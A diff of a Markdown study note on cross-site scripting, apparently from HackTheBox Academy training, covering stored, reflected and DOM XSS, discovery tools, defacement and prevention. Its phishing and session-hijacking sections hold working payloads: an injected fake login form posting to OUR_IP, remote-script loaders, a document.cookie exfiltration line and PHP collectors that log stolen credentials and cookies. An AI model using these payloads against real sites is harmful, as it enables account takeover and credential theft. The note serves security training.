@@ -1,170 +1,119 @@
-# XSS
+# Cross-Site Scripting (XSS)
 
-## XSS TYPES
+XSS = unsanitized user input lets an attacker "write" JavaScript into the page, executing client-side in other users' browsers. No direct back-end impact and limited to the browser's JS engine + same domain — but low impact × high prevalence = medium risk, and the attack surface inside the browser is wide: session cookie theft, forced API actions (password changes), defacement, crypto mining, ads. Chained with a browser binary exploit, it breaks out of the sandbox onto the machine. History worth remembering: Samy Worm (2005, stored XSS on MySpace, 1M+ infections in a day via self-reposting "Samy is my hero"), TweetDeck self-retweeting tweet (2014, 38k retweets in two minutes, forced a shutdown), Google search-bar XSS as late as 2019, Apache server XSS actively stealing passwords.
 
-**Stored/Persistent** — saved server-side, fires for every visitor on load. Most critical, zero delivery effort needed. **Reflected/Non-Persistent** — bounces through the backend once, echoed back unsanitized, never saved. Delivery = crafted link. **DOM-based/Non-Persistent** — pure client-side, backend never sees it. Tell: no HTTP request fires in the Network tab when you test it.
+Three types:
 
-All three are stuck inside the browser's JS engine, same-origin sandboxed — no system-level exec unless chained with an actual browser 0-day. Low impact + XSS being everywhere = medium risk in most report templates.
+- **Stored (Persistent)** — input saved to the back-end DB and executed on retrieval (posts/comments). Most critical: hits every visitor, survives refreshes, removal requires purging the DB.
+- **Reflected (Non-Persistent)** — input processed by the back-end and echoed back unfiltered (error/confirmation messages). Temporary; targets whoever you send the crafted URL to.
+- **DOM-based** — input never reaches the back-end; JavaScript processes it client-side and writes it into the page (URL hash params). Least scope, but same attacker URL-delivery model.
 
-## STORED XSS
+## Stored XSS
+
+Payload stored server-side → alert on every visit by anyone. Test payload:
 
 ```html
 <script>alert(window.origin)</script>
 ```
 
-`window.origin` over a static value — tells you which origin actually fired, matters if the form's sitting inside a cross-domain iframe.
+`window.origin` (not a static `1`) because modern apps run forms in cross-domain IFrames — the alert reveals which origin actually executed the code. Alternatives when `alert()` is blocked: `<plaintext>` (stops HTML rendering, dumps the rest as text) and `<script>print()</script>` (print dialog — never blocked). Confirm persistence by refreshing; confirm injection with CTRL+U (payload visible in page source).
 
-If `alert()` gets blocked:
+## Reflected XSS
 
-```html
-<plaintext>
+Input goes to the back-end and comes back inside a response (e.g. `Task 'test' could not be added.`). Same test payload; the script tags render empty in the echoed text but execute. Not persistent — leaving the page kills it.
+
+Delivery: check DevTools (CTRL+SHIFT+I → Network) for the request method. GET means the payload rides the URL — send the victim:
+
+```text
+http://SERVER_IP:PORT/index.php?task=<script>alert(window.origin)</script>
 ```
 
-kills rendering from that point on, dumps the rest raw.
-
-```html
-<script>print()</script>
-```
-
-print dialog — basically unblockable.
-
-Refresh to confirm persistence. Fires again without resubmitting = stored. `CTRL+U`, check the raw `<script>` landed unescaped.
-
-## REFLECTED XSS
-
-Same payload, no persistence — echoed once in the response, gone on refresh.
-
-GET request → payload rides the URL:
-
-```
-http://<TARGET_IP>:<PORT>/index.php?task=<script>alert(window.origin)</script>
-```
-
-POST → need a self-submitting form hosted somewhere, can't just hand over a link.
+Copy the URL from the address bar or right-click the request → Copy → Copy URL.
 
 ## DOM XSS
 
-Test: submit input, check Network tab (`CTRL+SHIFT+I`). Nothing fires = DOM. Param often sits after a `#` (fragment — never leaves the browser). `CTRL+U` won't show your injection (static base HTML); use Inspector (`CTRL+SHIFT+C`) for the live DOM instead.
+No HTTP request fires on input (Network tab stays empty); the parameter lives after a `#` in the URL — pure client-side processing. The payload never appears in the base page source (CTRL+U) because JS modifies the page after load; inspect the live DOM with CTRL+SHIFT+C instead.
 
-Source = wherever JS reads the input. Sink = wherever JS writes it into the page. Unsanitized sink, you're in.
+**Source & Sink:** Source = the JavaScript object taking user input (URL param, input field). Sink = the function writing it into the DOM. Unsantizing sinks:
 
-Vanilla sinks:
+- `document.write()`, `DOM.innerHTML`, `DOM.outerHTML`
+- jQuery: `add()`, `after()`, `append()`
 
-```
-document.write()
-DOM.innerHTML
-DOM.outerHTML
-```
+Module example (script.js): Source reads `task=` from `document.URL`; sink is `document.getElementById("todo").innerHTML = ... decodeURIComponent(task)` — controllable input, no sanitization, vulnerable.
 
-jQuery: `add()`, `after()`, `append()`.
-
-Typical vulnerable setup:
-
-```javascript
-var pos = document.URL.indexOf("task=");
-var task = document.URL.substring(pos + 5, document.URL.length);
-document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
-```
-
-`innerHTML` strips `<script>` tags on its own — not a security fix, just browser behavior, route around it:
+`innerHTML` won't execute `<script>` tags (security feature), so switch vectors:
 
 ```html
 <img src="" onerror=alert(window.origin)>
 ```
 
-Empty `src` = guaranteed fail = `onerror` fires. Deliver via fragment:
+Empty src guarantees the error fires. Delivered as `#task=<img src='' onerror=alert(window.origin)>`.
 
-```
-http://<TARGET_IP>:<PORT>/#task=<img src='' onerror=alert(window.origin)>
-```
+## XSS Discovery
 
-## XSS DISCOVERY
-
-### AUTOMATED
-
-Burp Pro / ZAP / Nessus — passive scan reads client-side code for DOM sinks, active scan injects and checks reflections. Free tier: XSStrike, BruteXSS, XSSer.
+- **Scanners** — Nessus/Burp Pro/ZAP do passive (client-side DOM review) and active (payload injection) scanning. Paid tools are more accurate once bypasses are needed.
+- **Open-source tools** — XSStrike, Brute XSS, XSSer. XSStrike pattern: find input fields, fire payloads, compare rendered source for reflections. Always manually verify — a reflected payload isn't always an executed one.
 
 ```bash
-git clone https://github.com/s0md3v/XSStrike.git
-cd XSStrike
+git clone https://github.com/s0md3v/XSStrike.git && cd XSStrike
 pip install -r requirements.txt
-python xsstrike.py -u "http://<TARGET_IP>:<PORT>/index.php?task=test"
+python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
+# WAF status, reflections found, generated payloads with efficiency/confidence scores
 ```
 
-### MANUAL
+- **Manual payload lists** — PayloadsAllTheThings, PayloadBox. Most entries target specific injection points (post-quote, post-attribute) or evasions — expect most to fail on any given app. XSS isn't limited to form fields: any displayed input counts, including Cookie and User-Agent headers.
+- **Code review** — the reliable method (front- and back-end): trace input handling end to end, write a payload that fits exactly. The only realistic way into mature apps whose devs already ran scanners.
 
-Payload lists — pull from these, don't write from scratch: PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings payload-box: https://github.com/payloadbox/xss-payload-list
+## Defacing
 
-Most payloads target a specific injection context (breaking out of quotes, evading a filter, img/CSS vector vs raw script tag) — expect most to just fail on any given target, that's normal. Don't skip headers — `User-Agent`, `Cookie` — count if they ever get reflected anywhere on the page.
-
-### CODE REVIEW
-
-Most reliable option. Trace source → sink through both ends of the stack, write a payload for exactly how it's handled instead of spraying generic lists.
-
-## DEFACING
-
-Requires Stored XSS — has to stick for anyone visiting.
+Classic stored-XSS attack — change what every visitor sees (NHS 2018 example; real media/share-price fallout). Four levers:
 
 ```javascript
-document.body.style.background   // bg color
-document.body.background          // bg image
-document.title                    // title
-DOM.innerHTML                     // page text
+document.body.style.background = "#141d2b"          // background color
+document.body.background = "https://.../logo.svg"   // background image
+document.title = 'HackTheBox Academy'               // tab title
+document.getElementsByTagName('body')[0].innerHTML = '...'   // replace entire page body
+// jQuery equivalents, when the page loads jQuery:
+$("#todo").html('New Text');
 ```
 
-```html
-<script>document.body.style.background = "#141d2b"</script>
-<script>document.body.background = "https://<IMAGE_URL>"</script>
-<script>document.title = 'HackTheBox Academy'</script>
-```
+Defacement payload = the replacement HTML minified to one line inside innerHTML. Original source stays underneath — the injected scripts (appended at the end of the source) rewrite the render. Middle-of-page injections need accounting for whatever loads after them. Draft and test the HTML locally before committing it.
 
-Full body swap — test the HTML locally first, minify to one line before firing:
+## Phishing
 
-```html
-<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1></center>'</script>
-```
+Inject a fake login form that ships credentials to the attacker's listener.
 
-Stack them, they all fire independently.
+Discovery first: find a working payload for the vulnerable app (module's image viewer at `/phishing` rejects `<script>` — inspect how input lands in the source to pick the right vector).
 
-## PHISHING
-
-```html
-<h3>Please login to continue</h3>
-<form action=http://<OUR_IP>>
-<input type="username" name="username" placeholder="Username">
-<input type="password" name="password" placeholder="Password">
-<input type="submit" name="submit" value="Login">
-</form>
-```
-
-Inject through `document.write()`, minified:
+Injected form (minified, written via `document.write()`), `OUR_IP` = tun0:
 
 ```javascript
-document.write('<h3>Please login to continue</h3><form action=http://<OUR_IP>>...</form>');
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
 ```
 
-Kill the real form so yours is the only option — grab its ID with `CTRL+SHIFT+C`:
+Cleanup for credibility:
 
 ```javascript
-document.getElementById('urlform').remove();
+document.getElementById('urlform').remove();   // strip the real input form (find the id via CTRL+SHIFT+C picker)
 ```
 
-Comment out whatever HTML trails after your payload: `<!--` at the end, done.
+Append `<!--` after the payload to comment out the leftover original HTML. The page now looks like it legitimately requires login.
 
-Netcat catches creds but leaves the victim staring at a broken connection:
+Catch credentials — netcat shows them raw but returns an error page:
 
 ```bash
 sudo nc -lvnp 80
+# GET /?username=test&password=test&submit=Login HTTP/1.1
 ```
 
-PHP listener does it properly — logs then bounces them back to the real page like nothing happened:
+PHP collector logs and redirects the victim back to the clean original page (they think the login worked):
 
 ```php
 <?php
 if (isset($_GET['username']) && isset($_GET['password'])) {
     $file = fopen("creds.txt", "a+");
     fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
-    header("Location: http://<TARGET_IP>/<PATH>");
+    header("Location: http://SERVER_IP/phishing/index.php");
     fclose($file);
     exit();
 }
@@ -172,50 +121,39 @@ if (isset($_GET['username']) && isset($_GET['password'])) {
 ```
 
 ```bash
-mkdir /tmp/tmpserver && cd /tmp/tmpserver
-vi index.php
+mkdir /tmp/tmpserver && cd /tmp/tmpserver   # index.php lives here
 sudo php -S 0.0.0.0:80
 ```
 
-## SESSION HIJACKING (BLIND XSS)
+## Session Hijacking
 
-Blind = it fires somewhere you can't see — admin panel, review queue. Usual suspects: contact forms, reviews, user details, support tickets, even the `User-Agent` header.
-
-Figure out which field's vulnerable by naming the callback after the field:
+**Blind XSS** — the payload fires on a page you can't see (admin panels behind contact forms, reviews, user details, support tickets, the User-Agent header). Detection trick: inject a remote-script loader whose path names the field — whichever field's name arrives at your listener is the vulnerable one:
 
 ```html
-<script src="http://<OUR_IP>/username"></script>
+<script src=http://OUR_IP/username></script>
 ```
 
-Don't bother testing email (validated both ends, basically always) or password (hashed, never comes back in clear). Rotate through these per field — injection context changes what lands (PayloadsAllTheThings):
+Remote-script payload set (from PayloadsAllTheThings) to rotate through:
 
 ```html
-<script src=http://<OUR_IP>></script>
-'><script src=http://<OUR_IP>></script>
-"><script src=http://<OUR_IP>></script>
-javascript:eval('var a=document.createElement(\'script\');a.src=\'http://<OUR_IP>\';document.body.appendChild(a)')
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//<OUR_IP>");a.send();</script>
-<script>$.getScript("http://<OUR_IP>")</script>
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
 ```
 
-```bash
-mkdir /tmp/tmpserver && cd /tmp/tmpserver
-sudo php -S 0.0.0.0:80
-```
+Smart field triage: email validated both ends → skip; password hashed → skip. Blind XSS pairs best with DOM-type sinks since the source is reviewable.
 
-Once you've got a working field + payload, swap the callback for a cookie grab:
+Cookie-grabber script (served as script.js; the Image variant is quieter than a location redirect):
 
 ```javascript
-new Image().src='http://<OUR_IP>/index.php?c='+document.cookie
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
 
-Image request over `document.location=` — looks incidental instead of a redirect. Host as `script.js`:
-
-```html
-<script src=http://<OUR_IP>/script.js></script>
-```
-
-PHP catcher, one line per victim:
+Collector splits multi-cookie strings and logs victim IP per line:
 
 ```php
 <?php
@@ -231,58 +169,14 @@ if (isset($_GET['c'])) {
 ?>
 ```
 
-Replay: victim's login page, Storage tab (`SHIFT+F9` Firefox), add the cookie manually — Name before the `=`, Value after — refresh, you're in as them.
+Server sees two hits — `/script.js`, then `/index.php?c=...`. Use the cookie: Firefox DevTools → Storage (SHIFT+F9) → + → Name/Value from the stolen pair → refresh → logged in as the victim.
 
-## XSS PREVENTION
+## XSS Prevention
 
-### FRONT-END
+Secure the Source and the Sink on both ends.
 
-Validate input format client-side (regex). Sanitize with DOMPurify (https://github.com/cure53/DOMPurify):
+**Front-end:** validate input (regex, e.g. the email format check); sanitize with DOMPurify (`let clean = DOMPurify.sanitize(dirty)` — escapes specials); never place raw user input inside `<script>`, `<style>`, tag/attribute fields, or HTML comments; avoid the raw-writing functions — `DOM.innerHTML`, `DOM.outerHTML`, `document.write()`, `document.writeln`, `document.domain`, and jQuery `html()`, `parseHTML()`, `add()`, `append()`, `prepend()`, `after()`, `insertAfter()`, `before()`, `insertBefore()`, `replaceAll()`, `replaceWith()`.
 
-```html
-<script type="text/javascript" src="dist/purify.min.js"></script>
-```
+**Back-end:** front-end checks bypass trivially with custom requests, so validate again server-side (`filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)`); sanitize (`addslashes()` in PHP; DOMPurify in Node); **output-encode** anything displayed — `htmlspecialchars`/`htmlentities` (PHP, `<` → `&lt;`), `html-entities` (Node).
 
-```javascript
-let clean = DOMPurify.sanitize(dirty);
-```
-
-Never let raw input touch `<script></script>`, `<style></style>`, tag/attribute fields, or HTML comments. Stay away from raw-write sinks entirely: `DOM.innerHTML`, `DOM.outerHTML`, `document.write()`, `document.writeln()`, `document.domain` — jQuery: `html()`, `parseHTML()`, `add()`, `append()`, `prepend()`, `after()`, `insertAfter()`, `before()`, `insertBefore()`, `replaceAll()`, `replaceWith()`.
-
-### BACK-END
-
-Front-end validation means nothing on its own — trivial to bypass with a raw GET/POST, mirror it server-side:
-
-```php
-if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) { /* ok */ } else { /* reject */ }
-```
-
-PHP sanitization:
-
-```php
-addslashes($_GET['email'])
-```
-
-Node — DOMPurify again:
-
-```javascript
-import DOMPurify from 'dompurify';
-var clean = DOMPurify.sanitize(dirty);
-```
-
-Output encoding so input can display without executing (`<` → `&lt;`) — PHP:
-
-```php
-htmlentities($_GET['email']);
-```
-
-Node (`html-entities`):
-
-```javascript
-import encode from 'html-entities';
-encode('<'); // -> '&lt;'
-```
-
-### SERVER CONFIG
-
-HTTPS everywhere, `X-Content-Type-Options: nosniff`, `Content-Security-Policy: script-src 'self'`, `HttpOnly` + `Secure` cookie flags (HttpOnly alone kills cookie theft via XSS specifically), WAF in front, framework-level protection where it exists (ASP.NET has it built in).
+**Server config:** HTTPS everywhere; XSS-prevention headers; correct Content-Type with `X-Content-Type-Options=nosniff`; `Content-Security-Policy: script-src 'self'` (locally hosted scripts only); `HttpOnly` + `Secure` cookie flags so JavaScript can't read cookies and transport is HTTPS-only. WAF on top; some frameworks (ASP.NET) ship built-in XSS protection. Even with all of it — keep testing; gaps survive secure coding and configuration.
